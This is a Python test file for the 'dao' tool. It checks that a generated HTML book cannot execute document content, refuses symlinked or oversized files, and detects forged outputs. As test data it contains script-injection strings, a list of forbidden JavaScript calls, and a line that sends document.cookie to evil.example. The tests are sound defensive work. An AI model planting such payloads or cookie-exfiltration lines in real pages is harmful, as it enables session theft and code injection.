"""The book: a copy of the documents that says only what they say, and cannot act.

Three properties are held here. The book derives the cross-references a reader needs. The page
carries the documents' words as data and runs one script, the element dao ships, so nothing a
document contains runs. And `dao check` knows when any of the book's files has fallen behind
the documents. What the element does with the words is held by its own tests, in `web/`.
"""

from __future__ import annotations

import json
import re
from importlib import metadata
from pathlib import Path
from typing import TYPE_CHECKING

from click.testing import CliRunner

from dao.adapters._in.cli import main
from dao.adapters._out.page import data, element, files, page, write
from dao.application.audit import POLICY, audit, complete
from dao.application.book import UNTITLED, build, chains, check
from dao.application.organization import Organization, made_from
from dao.application.reading import read_participants, read_positions, sections
from dao.domain.models import Position
from dao.domain.spec import SPEC, Coverage, Key, Status

if TYPE_CHECKING:
    import pytest

    from dao.domain.book import Book

BOOK_FILES = (POLICY.book, POLICY.book_data, POLICY.book_element)


def _page(project: Path) -> str:
    return page(build(project), version="test")


def _files(book: Book) -> dict[str, str]:
    return files(book, version=metadata.version("dao"))


def _carried(html: str) -> object:
    """The book a page carries, read the way a browser hands it to the element."""
    blocks = re.findall(r'<script type="application/json">(.*?)</script>', html, re.S)
    assert len(blocks) == 1
    return json.loads(blocks[0])


def _append(project: Path, name: str, text: str) -> None:
    path = project / "dao" / name
    path.write_text(path.read_text(encoding="utf-8") + text, encoding="utf-8")


def _checked(project: Path) -> list[Coverage]:
    """What `dao check` computes: the audit, with the book held to the files dao writes."""
    return check(project, render=_files)


def _front_door_gaps(project: Path) -> list[str]:
    return next(c for c in _checked(project) if c.element.key is Key.FRONT_DOOR).gaps


def _gaps_of(project: Path, key: Key) -> str:
    return " | ".join(next(c for c in audit(project) if c.element.key is key).gaps)


# --- what the book works out -------------------------------------------------------


def test_the_book_cross_references_positions_and_participants(project: Path) -> None:
    book = build(project)
    assert book.title == "How tidepool is run"
    assert book.complete
    assert [d.key for d in book.documents] == [e.key for e in SPEC]

    by_name = {p.name: p for p in book.positions}
    assert by_name["builder"].held_by == ("the session",)
    assert by_name["builder"].checked_by == ("reviewer",)
    assert by_name["reviewer"].checks == ("builder",)
    assert by_name["owner"].held_only_by_people
    assert not by_name["reviewer"].held_only_by_people
    assert book.chains == (("builder", "reviewer", "owner"),)


def test_a_document_keeps_its_text_and_loses_only_its_title_line(project: Path) -> None:
    constitution = build(project).document(Key.CONSTITUTION)
    assert constitution.markdown.startswith("## Purpose")
    assert "A released version never changes." in constitution.markdown


def test_a_readme_without_a_title_gets_a_plain_one(project: Path) -> None:
    readme = project / "dao" / "README.md"
    readme.write_text(readme.read_text().replace("# How tidepool is run\n", ""))
    assert build(project).title == UNTITLED


def test_chains_drop_tails_and_do_not_walk_a_loop_twice() -> None:
    def position(name: str, *checked_by: str) -> Position:
        return Position(name=name, checked_by=checked_by)

    line = [position("a", "b"), position("b", "c"), position("c")]
    assert chains(line) == (("a", "b", "c"),)

    two_into_one = [position("a", "c"), position("b", "c"), position("c")]
    assert chains(two_into_one) == (("a", "c"), ("b", "c"))

    loop = [position("a", "b"), position("b", "a")]
    assert chains(loop) == (("a", "b"),)

    alone = [position("a"), position("b", "nobody-here")]
    assert chains(alone) == (("a",), ("b",))


def test_an_incomplete_organization_still_makes_a_book_that_says_so(project: Path) -> None:
    (project / "dao" / "principles.md").unlink()
    book = build(project)
    assert not book.complete
    assert book.document(Key.PRINCIPLES).status is Status.ABSENT
    assert "no dao/principles.md" in " ".join(book.document(Key.PRINCIPLES).gaps)
    assert "no dao/principles.md" in data(book)


# --- the page cannot act ------------------------------------------------------------


def test_the_page_runs_one_script_and_loads_nothing_else(project: Path) -> None:
    html = _page(project)
    assert html.startswith("<!doctype html>")
    assert "default-src 'none'; script-src 'self'; style-src 'unsafe-inline'" in html
    assert "base-uri 'none'" in html
    assert re.findall(r"<script[^>]*>", html) == [
        '<script type="application/json">',
        f'<script src="{POLICY.book_element}">',
    ]
    assert "http://" not in html and "https://" not in html
    assert "@import" not in html and "url(" not in html
    assert not re.search(r"\son[a-z]+=", html)


def test_the_page_carries_the_book_it_was_made_from(project: Path) -> None:
    book = build(project)
    assert _carried(page(book, version="test")) == json.loads(data(book))


def test_nothing_in_a_document_can_leave_the_data_block(project: Path) -> None:
    _append(project, "constitution.md", '\n</script><script>alert("x")</script>\n\n<!-- x\n')
    _append(project, "principles.md", "- </SCRIPT ><img src=x onerror=y>\n")
    participants = project / "dao" / "participants.md"
    participants.write_text(
        participants.read_text().replace("| ada |", '| ada"></script><script>x</script> |')
    )
    readme = project / "dao" / "README.md"
    readme.write_text(readme.read_text().replace("# How", "# </title><script>t()</script>How"))

    book = build(project)
    html = page(book, version="test")
    assert html.lower().count("<script") == 2
    assert html.lower().count("</script") == 2
    assert "<!--" not in html and "<img" not in html
    assert html.count("</title>") == 1
    # The words are all still there, as data.
    assert _carried(html) == json.loads(data(book))
    assert 'alert(\\"x\\")' in data(book)


def test_the_same_documents_make_the_same_files(project: Path) -> None:
    assert _files(build(project)) == _files(build(project))
    assert set(_files(build(project))) == set(BOOK_FILES)


def test_the_element_calls_nothing_that_runs_text_or_reaches_the_network() -> None:
    """A search of the shipped script for the calls that would. The page's policy is the
    second line: it forbids every load whatever the script asks for."""
    script = element()
    for call in (
        "eval(",
        "new Function",
        "import(",
        "XMLHttpRequest",
        "WebSocket",
        "EventSource",
        "sendBeacon",
        "Worker(",
    ):
        assert call not in script
    # The one request it can make is for the book its `src` names.
    assert script.count("fetch(") == 1


def test_the_element_reads_the_format_the_book_is_written_in(project: Path) -> None:
    source = Path(__file__).parents[1] / "web" / "src" / "model.ts"
    declared = re.search(r"^export const FORMAT = (\d+);$", source.read_text(), re.M)
    assert declared is not None
    assert int(declared.group(1)) == build(project).format


# --- what dao reads from a project ---------------------------------------------------


def test_a_document_that_is_a_link_is_not_read(
    project: Path, tmp_path_factory: pytest.TempPathFactory
) -> None:
    """A repository can carry a link to any file its reader can open. dao does not follow it."""
    outside = tmp_path_factory.mktemp("outside") / "credentials"
    outside.write_text("- aws_secret_access_key = FAKE\n- two\n- three\n")
    principles = project / "dao" / "principles.md"
    principles.unlink()
    principles.symlink_to(outside)

    assert "principles.md is a symbolic link, so it is not read" in _gaps_of(
        project, Key.PRINCIPLES
    )
    assert "FAKE" not in _page(project)
    result = CliRunner().invoke(main, ["book", str(project), "--json"])
    assert "FAKE" not in result.output


def test_a_device_or_an_oversized_file_is_not_read(project: Path) -> None:
    positions = project / "dao" / "positions.md"
    positions.unlink()
    positions.symlink_to("/dev/zero")
    assert "is a symbolic link" in _gaps_of(project, Key.POSITIONS)
    build(project)

    positions.unlink()
    positions.write_bytes(b"x" * (POLICY.document_max_bytes + 1))
    assert f"is larger than {POLICY.document_max_bytes} bytes" in _gaps_of(project, Key.POSITIONS)


def test_documents_in_a_directory_linked_from_outside_are_not_read(
    project: Path, tmp_path_factory: pytest.TempPathFactory
) -> None:
    outside = tmp_path_factory.mktemp("outside")
    (project / "dao").rename(outside / "dao")
    (project / "dao").symlink_to(outside / "dao")
    coverage = audit(project)
    assert [c.status for c in coverage] == [Status.ABSENT] * len(SPEC)
    assert "is outside the project" in coverage[0].gaps[0]
    result = CliRunner().invoke(main, ["book", str(project), "--json"])
    assert "tidepool" not in result.output


def test_a_defined_in_path_the_system_rejects_is_a_gap_not_a_crash(project: Path) -> None:
    participants = project / "dao" / "participants.md"
    participants.write_text(
        participants.read_text().replace(".claude/agents/cold-reader.md", "x" * 5000)
    )
    # Which of the two it is depends on the system: some refuse a name this long, and some
    # answer that no such file exists. Either way it is a gap that names the participant.
    gaps = _gaps_of(project, Key.PARTICIPANTS)
    assert (
        "cold-reader is defined in a path that cannot be read" in gaps
        or "cold-reader is defined in a file that does not exist" in gaps
    )


def test_no_line_can_make_reading_slow() -> None:
    """Each of these took seconds to minutes before the patterns were made linear.

    The suite's per-test timeout is the assertion: all of this runs in well under a second.
    """
    gap = " " * 200_000
    sections(f"## a{gap}b\n\ntext\n")
    read_positions(f"## p\n\n{gap}\n- {gap}x\nDoes:{gap}x\n")
    read_participants(f"| Participant | Position |\n{gap}|---|---|\n|{gap}-{gap}|\n")
    line = [Position(name=str(i), checked_by=(str(i + 1),)) for i in range(20_000)]
    assert len(chains(line)) == 1


def test_a_large_organization_is_read_in_time_linear_in_its_size(project: Path) -> None:
    """Asking every participant about every position took minutes at this size."""
    n = 30_000
    (project / "dao" / "positions.md").write_text(
        "# Positions\n\n" + "".join(f"## p{i}\n\nDoes: x\n\n" for i in range(n))
    )
    (project / "dao" / "participants.md").write_text(
        "# Participants\n\n| Participant | Kind | Position |\n|---|---|---|\n"
        + "".join(f"| u{i} | agent | p{i} |\n" for i in range(n))
    )
    book = build(project)
    assert len(book.positions) == n
    assert book.positions[-1].held_by == (f"u{n - 1}",)


def test_a_heading_keeps_its_text_and_loses_closing_hashes() -> None:
    assert list(sections("## Purpose ##\n\nx\n## C# and F#\n\ny\n")) == ["Purpose", "C# and F#"]


# --- the page and the documents stay together --------------------------------------


def test_a_fresh_book_is_current_and_an_edit_makes_it_stale(project: Path) -> None:
    assert CliRunner().invoke(main, ["book", str(project)]).exit_code == 0
    org = Organization(project)
    for name in BOOK_FILES:
        assert org.book_file(name) == project / "dao" / name
        assert org.book_file(name).is_file()
    assert made_from(org.book_file(POLICY.book).read_text()) == org.sources()
    assert made_from(org.book_file(POLICY.book_data).read_text()) == org.sources()
    front = next(c for c in _checked(project) if c.element.key is Key.FRONT_DOOR)
    assert "book.html, book.json, dao-book.js: as `dao book` writes" in front.evidence
    assert complete(_checked(project))
    assert CliRunner().invoke(main, ["check", str(project)]).exit_code == 0

    _append(project, "principles.md", "- Write the date in ISO 8601.\n")
    stale = " ".join(_front_door_gaps(project))
    assert "dao/book.html was made from older documents" in stale
    assert "dao/book.json was made from older documents" in stale
    assert POLICY.book_element not in stale

    assert CliRunner().invoke(main, ["book", str(project)]).exit_code == 0
    assert complete(_checked(project))


def test_a_book_dao_did_not_write_is_reported(project: Path) -> None:
    (project / "dao" / POLICY.book).write_text("<html>by hand</html>")
    assert "is not the file `dao book` writes" in " ".join(_front_door_gaps(project))


def test_a_forged_book_with_the_right_digest_is_not_vouched_for(project: Path) -> None:
    """The digest can be copied onto anything, so the check makes the files again and compares."""
    digest = Organization(project).sources()
    forged = f'<!doctype html><meta name="dao-sources" content="{digest}"><script>x()</script>'
    (project / "dao" / POLICY.book).write_text(forged)
    (project / "dao" / POLICY.book_data).write_text(f'{{"format": 1, "sources": "{digest}"}}')
    gaps = " ".join(_front_door_gaps(project))
    assert "dao/book.html is not the file `dao book` writes" in gaps
    assert "dao/book.json is not the file `dao book` writes" in gaps
    assert CliRunner().invoke(main, ["check", str(project)]).exit_code == 1


def test_an_element_that_is_not_the_one_dao_ships_is_reported(project: Path) -> None:
    """The page runs this file, so a changed copy is the finding that matters most."""
    assert CliRunner().invoke(main, ["book", str(project)]).exit_code == 0
    script = project / "dao" / POLICY.book_element
    script.write_text(script.read_text() + "\nfetch('https://evil.example/' + document.cookie)\n")
    assert "dao/dao-book.js is not the file `dao book` writes" in " ".join(
        _front_door_gaps(project)
    )


def test_a_project_may_keep_only_the_data(project: Path) -> None:
    """A docsite that draws the book itself needs book.json and nothing else."""
    assert CliRunner().invoke(main, ["book", str(project)]).exit_code == 0
    (project / "dao" / POLICY.book).unlink()
    (project / "dao" / POLICY.book_element).unlink()
    assert _front_door_gaps(project) == []
    _append(project, "principles.md", "- Write the date in ISO 8601.\n")
    assert "dao/book.json was made from older documents" in " ".join(_front_door_gaps(project))


def test_a_book_that_is_a_link_is_not_read(
    project: Path, tmp_path_factory: pytest.TempPathFactory
) -> None:
    outside = tmp_path_factory.mktemp("outside") / "secret"
    outside.write_text("the secret")
    (project / "dao" / POLICY.book).symlink_to(outside)
    assert "is a symbolic link" in " ".join(_front_door_gaps(project))


def test_a_forged_element_is_reported_when_the_readme_is_missing_too(project: Path) -> None:
    (project / "dao" / POLICY.book_element).write_text("alert('forged')")
    (project / "dao" / "README.md").unlink()
    gaps = " ".join(_front_door_gaps(project))
    assert "no dao/README.md" in gaps
    assert "dao/dao-book.js is not the file `dao book` writes" in gaps


def test_a_participant_listed_twice_is_a_gap(project: Path) -> None:
    _append(project, "participants.md", "| ada | human | owner | |\n")
    assert "listed more than once: ada" in _gaps_of(project, Key.PARTICIPANTS)


def test_no_book_is_not_a_gap(project: Path) -> None:
    assert _front_door_gaps(project) == []


def test_a_missing_document_changes_the_digest(project: Path) -> None:
    before = Organization(project).sources()
    (project / "dao" / "principles.md").write_text("")
    emptied = Organization(project).sources()
    (project / "dao" / "principles.md").unlink()
    assert len({before, emptied, Organization(project).sources()}) == 3


# --- the command ---------------------------------------------------------------------


def test_book_json_prints_the_organization_and_writes_nothing(project: Path) -> None:
    result = CliRunner().invoke(main, ["book", str(project), "--json"])
    assert result.exit_code == 0
    assert result.output == data(build(project))
    printed = json.loads(result.output)
    assert printed["format"] == 1
    assert printed["title"] == "How tidepool is run"
    assert printed["chains"] == [["builder", "reviewer", "owner"]]
    assert not any((project / "dao" / name).exists() for name in BOOK_FILES)


def test_book_needs_a_directory_of_documents(tmp_path: Path) -> None:
    result = CliRunner().invoke(main, ["book", str(tmp_path)])
    assert result.exit_code == 1
    assert "no dao/" in result.output


def test_book_does_not_write_through_a_symlink(
    project: Path, tmp_path_factory: pytest.TempPathFactory
) -> None:
    outside = tmp_path_factory.mktemp("outside") / "target.html"
    outside.write_text("untouched")
    (project / "dao" / POLICY.book).symlink_to(outside)
    result = CliRunner().invoke(main, ["book", str(project)])
    assert result.exit_code == 1
    assert outside.read_text() == "untouched"
    assert not (project / "dao" / POLICY.book_data).exists()


def test_book_refuses_a_target_that_is_not_a_file_and_writes_nothing(project: Path) -> None:
    (project / "dao" / POLICY.book).mkdir()
    result = CliRunner().invoke(main, ["book", str(project)])
    assert result.exit_code == 1
    assert "is not a file" in result.output
    assert not isinstance(result.exception, OSError)
    assert not (project / "dao" / POLICY.book_data).exists()
    assert not (project / "dao" / POLICY.book_element).exists()


def test_the_write_replaces_a_link_and_does_not_follow_it(
    project: Path, tmp_path_factory: pytest.TempPathFactory
) -> None:
    """Whatever is planted at the target after the command's checks, the page stays put."""
    outside = tmp_path_factory.mktemp("outside") / "victim.txt"
    outside.write_text("untouched")
    target = project / "dao" / POLICY.book
    target.symlink_to(outside)
    write("<!doctype html>", target)
    assert outside.read_text() == "untouched"
    assert not target.is_symlink()
    assert target.read_text() == "<!doctype html>"
    assert [p.name for p in (project / "dao").iterdir() if p.name.endswith(".tmp")] == []


def test_book_does_not_write_outside_the_project(
    project: Path, tmp_path_factory: pytest.TempPathFactory
) -> None:
    elsewhere = tmp_path_factory.mktemp("elsewhere")
    result = CliRunner().invoke(main, ["book", str(project), "--dir", f"../{elsewhere.name}"])
    assert result.exit_code == 1
    assert list(elsewhere.iterdir()) == []


def test_check_json_carries_every_verdict(
    project: Path, tmp_path_factory: pytest.TempPathFactory
) -> None:
    result = CliRunner().invoke(main, ["check", str(project), "--json"])
    assert result.exit_code == 0
    report = json.loads(result.output)
    assert report["complete"] is True
    assert [e["key"] for e in report["elements"]] == [e.key.value for e in SPEC]

    empty = tmp_path_factory.mktemp("empty")
    result = CliRunner().invoke(main, ["check", str(empty), "--json"])
    assert result.exit_code == 1
    report = json.loads(result.output)
    assert report["complete"] is False
    assert {e["status"] for e in report["elements"]} == {"ABSENT"}
